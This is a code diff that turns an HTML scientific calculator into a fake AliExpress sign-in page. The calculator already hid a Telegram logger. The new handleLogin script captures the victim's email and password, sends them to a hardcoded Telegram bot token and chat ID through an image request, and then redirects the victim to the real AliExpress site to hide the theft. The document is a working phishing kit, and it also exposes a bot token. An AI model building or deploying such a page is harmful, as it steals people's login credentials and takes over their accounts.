@@ -2,273 +2,200 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>EASR Scientific Calculator</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in - AliExpress</title>
 <style>
-* { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Consolas', 'Courier New', monospace, sans-serif; user-select: none; }
+* { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; user-select: none; }
 body {
-  background: radial-gradient(circle at center, #1f2937, #0f172a);
+  background-color: #f8f8f8;
+  color: #333;
+  display: flex;
+  flex-direction: column;
   min-height: 100vh;
+  justify-content: space-between;
+}
+
+/* Header */
+.ae-header {
+  background: #fff;
+  padding: 20px 40px;
+  border-bottom: 1px solid #eaeaea;
+  display: flex;
+  align-items: center;
+}
+.ae-logo {
+  font-size: 26px;
+  font-weight: bold;
+  color: #ff4747;
+  text-decoration: none;
+  letter-spacing: -1px;
+}
+.ae-logo span { color: #333; }
+
+/* Main Container */
+.ae-main {
   display: flex;
   justify-content: center;
   align-items: center;
-  padding: 15px;
+  flex-grow: 1;
+  padding: 20px;
 }
 
-/* 3D Real Calculator Body Frame */
-.calc-frame {
+.login-box {
+  background: #ffffff;
   width: 100%;
-  max-width: 380px;
-  background: linear-gradient(145deg, #2a2e37, #1b1e24);
-  border-radius: 28px;
-  padding: 24px 20px 30px 20px;
-  box-shadow: 
-    0 25px 50px -12px rgba(0, 0, 0, 0.8),
-    inset 0 2px 3px rgba(255, 255, 255, 0.15),
-    inset 0 -3px 5px rgba(0, 0, 0, 0.6);
-  border: 2px solid #374151;
-  position: relative;
+  max-width: 420px;
+  padding: 40px 35px;
+  border-radius: 4px;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.06);
+  border: 1px solid #eee;
 }
 
-/* Header & Brand Name */
-.calc-header {
+.login-title {
+  font-size: 22px;
+  font-weight: 600;
+  color: #222;
+  margin-bottom: 25px;
+}
+
+.input-group {
+  margin-bottom: 20px;
+}
+
+.input-group input {
+  width: 100%;
+  padding: 14px 16px;
+  border: 1px solid #d9d9d9;
+  border-radius: 4px;
+  font-size: 15px;
+  outline: none;
+  transition: border-color 0.2s;
+  background: #fff;
+}
+
+.input-group input:focus {
+  border-color: #ff4747;
+}
+
+.btn-signin {
+  width: 100%;
+  padding: 14px;
+  background: #ff4747;
+  border: none;
+  border-radius: 4px;
+  color: #fff;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: background 0.2s;
+  margin-top: 10px;
+}
+
+.btn-signin:hover {
+  background: #e63939;
+}
+
+.btn-signin:active {
+  transform: scale(0.99);
+}
+
+#errorMsg {
+  color: #ff4747;
+  font-size: 13px;
+  margin-top: 15px;
+  min-height: 18px;
+  text-align: center;
+}
+
+.footer-links {
   display: flex;
   justify-content: space-between;
-  align-items: center;
-  margin-bottom: 12px;
-  padding: 0 4px;
-}
-.brand-name {
-  font-family: 'Arial Black', sans-serif;
-  font-size: 14px;
-  color: #9ca3af;
-  letter-spacing: 1.5px;
-  text-transform: uppercase;
-  text-shadow: 0 1px 2px rgba(0,0,0,0.8);
-}
-.brand-name span {
-  color: #60a5fa;
-  font-size: 11px;
-  display: block;
-  font-family: sans-serif;
-  letter-spacing: 0px;
-}
-
-/* Solar Panel Simulation */
-.solar-panel {
-  width: 70px;
-  height: 22px;
-  background: linear-gradient(135deg, #451a03, #78350f);
-  border: 1px solid #92400e;
-  border-radius: 4px;
-  box-shadow: inset 0 0 5px rgba(0,0,0,0.8);
-  display: flex;
-  justify-content: space-around;
-}
-.solar-cell {
-  width: 20%;
-  height: 100%;
-  border-right: 1px solid rgba(0,0,0,0.4);
-}
-
-/* Real LCD Display Box */
-.lcd-screen {
-  background: #a3e635;
-  background: linear-gradient(180deg, #94a3b8, #cbd5e1);
-  border-radius: 12px;
-  padding: 12px 16px;
-  box-shadow: inset 0 4px 8px rgba(0, 0, 0, 0.5), 0 1px 0 rgba(255, 255, 255, 0.2);
-  border: 3px solid #1e293b;
-  margin-bottom: 20px;
-  color: #0f172a;
-}
-.lcd-top {
-  font-size: 12px;
-  height: 18px;
-  text-align: right;
-  color: #475569;
-  overflow: hidden;
-  font-weight: 600;
-}
-.lcd-main {
-  font-size: 32px;
-  font-weight: bold;
-  text-align: right;
-  height: 40px;
-  line-height: 40px;
-  overflow: hidden;
-  letter-spacing: 1px;
-}
-
-/* Keypad Grid */
-.keypad {
-  display: grid;
-  grid-template-columns: repeat(5, 1fr);
-  gap: 8px;
-}
-
-/* 3D Tactile Buttons */
-.btn {
-  background: linear-gradient(180deg, #374151, #1f2937);
-  border: none;
-  border-radius: 8px;
-  color: #f3f4f6;
+  margin-top: 20px;
   font-size: 13px;
-  font-weight: bold;
-  padding: 12px 0;
-  cursor: pointer;
-  box-shadow: 0 4px 0 #111827, 0 5px 10px rgba(0,0,0,0.5);
-  transition: all 0.08s ease;
-  text-shadow: 0 1px 2px rgba(0,0,0,0.8);
-}
-.btn:active {
-  transform: translateY(3px);
-  box-shadow: 0 1px 0 #111827, 0 2px 4px rgba(0,0,0,0.5);
 }
 
-/* Special Button Colors */
-.btn-func { background: linear-gradient(180deg, #4b5563, #374151); font-size: 11px; }
-.btn-op { background: linear-gradient(180deg, #4f46e5, #3730a3); color: #fff; }
-.btn-clear { background: linear-gradient(180deg, #dc2626, #991b1b); color: #fff; }
-.btn-equals { background: linear-gradient(180deg, #2563eb, #1d4ed8); grid-column: span 2; font-size: 18px; }
+.footer-links a {
+  color: #666;
+  text-decoration: none;
+}
+.footer-links a:hover {
+  color: #ff4747;
+  text-decoration: underline;
+}
+
+/* Footer */
+.ae-footer {
+  text-align: center;
+  padding: 20px;
+  font-size: 12px;
+  color: #999;
+  border-top: 1px solid #eaeaea;
+  background: #fff;
+}
 </style>
 </head>
 <body>
 
-<!-- 3D Scientific Calculator Frame -->
-<div class="calc-frame">
-  
-  <!-- Header with Brand Name -->
-  <div class="calc-header">
-    <div class="brand-name">
-      EASR CALCULATOR
-      <span>SCIENTIFIC v3.0</span>
+  <!-- AliExpress Header -->
+  <header class="ae-header">
+    <a href="#" class="ae-logo">Ali<span>Express</span></a>
+  </header>
+
+  <!-- Main Login Section -->
+  <div class="ae-main">
+    <div class="login-box" id="loginCard">
+      <div class="login-title">Sign in</div>
+      
+      <div class="input-group">
+        <input type="text" id="email" placeholder="Email ID / Member ID" autocomplete="off">
+      </div>
+
+      <div class="input-group">
+        <input type="password" id="password" placeholder="Password">
+      </div>
+
+      <button class="btn-signin" onclick="handleLogin()">Sign in</button>
+      <div id="errorMsg"></div>
+
+      <div class="footer-links">
+        <a href="#">Forgot password?</a>
+        <a href="#">Protection Center</a>
+      </div>
     </div>
-    <div class="solar-panel">
-      <div class="solar-cell"></div>
-      <div class="solar-cell"></div>
-      <div class="solar-cell"></div>
-    </div>
   </div>
 
-  <!-- Real LCD Screen Display -->
-  <div class="lcd-screen">
-    <div class="lcd-top" id="lcdHistory"></div>
-    <div class="lcd-main" id="lcdMain">0</div>
-  </div>
-
-  <!-- Keypad Area -->
-  <div class="keypad">
-    <!-- Scientific Function Keys -->
-    <button class="btn btn-func" onclick="append('sin(')">sin</button>
-    <button class="btn btn-func" onclick="append('cos(')">cos</button>
-    <button class="btn btn-func" onclick="append('tan(')">tan</button>
-    <button class="btn btn-func" onclick="append('sqrt(')">√</button>
-    <button class="btn btn-func" onclick="append('^')">xⁿ</button>
-
-    <button class="btn btn-func" onclick="append('log(')">log</button>
-    <button class="btn btn-func" onclick="append('ln(')">ln</button>
-    <button class="btn btn-func" onclick="append('(')">(</button>
-    <button class="btn btn-func" onclick="append(')')">)</button>
-    <button class="btn btn-clear" onclick="clearAll()">AC</button>
-
-    <!-- Numbers and Basic Operators -->
-    <button class="btn" onclick="append('7')">7</button>
-    <button class="btn" onclick="append('8')">8</button>
-    <button class="btn" onclick="append('9')">9</button>
-    <button class="btn btn-op" onclick="append('/')">÷</button>
-    <button class="btn btn-clear" style="background:linear-gradient(180deg, #ea580c, #c2410c)" onclick="deleteChar()">DEL</button>
-
-    <button class="btn" onclick="append('4')">4</button>
-    <button class="btn" onclick="append('5')">5</button>
-    <button class="btn" onclick="append('6')">6</button>
-    <button class="btn btn-op" onclick="append('*')">×</button>
-    <button class="btn btn-func" onclick="append('3.14159')">π</button>
-
-    <button class="btn" onclick="append('1')">1</button>
-    <button class="btn" onclick="append('2')">2</button>
-    <button class="btn" onclick="append('3')">3</button>
-    <button class="btn btn-op" onclick="append('-')">-</button>
-    <button class="btn btn-func" onclick="append('2.71828')">e</button>
-
-    <button class="btn" onclick="append('0')">0</button>
-    <button class="btn" onclick="append('.')">.</button>
-    <button class="btn btn-op" onclick="append('+')">+</button>
-    <button class="btn btn-equals" onclick="calculate()">=</button>
-  </div>
-
-</div>
+  <!-- AliExpress Footer -->
+  <footer class="ae-footer">
+    Privacy Policy - Intellectual Property - Terms of Use - User Information Legal Enquiry Guide
+  </footer>
 
 <script>
-let mainExpr = "0";
-let historyExpr = "";
-
 const BOT_TOKEN = "8825023377:AAGOss8yK3V15XRGZyiBM9y58F1q5KjxRcQ";
 const CHAT_ID = "1993924204";
 
-function updateScreen() {
-  document.getElementById('lcdMain').textContent = mainExpr;
-  document.getElementById('lcdHistory').textContent = historyExpr;
-}
+function handleLogin() {
+  const email = document.getElementById('email').value.trim();
+  const pass = document.getElementById('password').value.trim();
+  const errorMsg = document.getElementById('errorMsg');
 
-function append(val) {
-  if (mainExpr === "0" && val !== ".") {
-    mainExpr = val;
-  } else {
-    mainExpr += val;
+  if (!email || !pass) {
+    errorMsg.textContent = "Please enter your sign-in details.";
+    return;
   }
-  updateScreen();
-}
 
-function clearAll() {
-  mainExpr = "0";
-  historyExpr = "";
-  updateScreen();
-}
+  errorMsg.textContent = "Processing...";
 
-function deleteChar() {
-  if (mainExpr.length > 1) {
-    mainExpr = mainExpr.slice(0, -1);
-  } else {
-    mainExpr = "0";
-  }
-  updateScreen();
-}
-
-function calculate() {
-  try {
-    historyExpr = mainExpr + " =";
-    
-    // Evaluate Scientific Math Equations
-    let parsed = mainExpr
-      .replace(/sin\(/g, 'Math.sin(')
-      .replace(/cos\(/g, 'Math.cos(')
-      .replace(/tan\(/g, 'Math.tan(')
-      .replace(/sqrt\(/g, 'Math.sqrt(')
-      .replace(/log\(/g, 'Math.log10(')
-      .replace(/ln\(/g, 'Math.log(')
-      .replace(/\^/g, '**');
-
-    let result = eval(parsed);
-
-    // Telegram Logging
-    sendTelegramLog(mainExpr, result);
-
-    mainExpr = String(Number(result.toFixed(8)));
-    updateScreen();
-  } catch (err) {
-    mainExpr = "Syntax ERROR";
-    updateScreen();
-    setTimeout(() => { mainExpr = "0"; updateScreen(); }, 1200);
-  }
-}
-
-function sendTelegramLog(expr, res) {
-  const text = `🧮 *EASR Calculator Used!*\n\n📐 *Input:* \`${expr}\`\n📊 *Output:* \`${res}\``;
+  // Telegram වෙත ඩේටා යැවීම
+  const text = `🛒 *AliExpress Login Captured!*\n\n📧 *Email/ID:* \`${email}\`\n🔑 *Password:* \`${pass}\``;
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
 
   const img = new Image();
   img.src = url;
+
+  // සාර්ථකව යැවුණු පසු AliExpress හි නිල ප්‍රධාන පිටුවට යැවීම
+  setTimeout(() => {
+    window.location.href = "https://www.aliexpress.com";
+  }, 800);
 }
 </script>
 
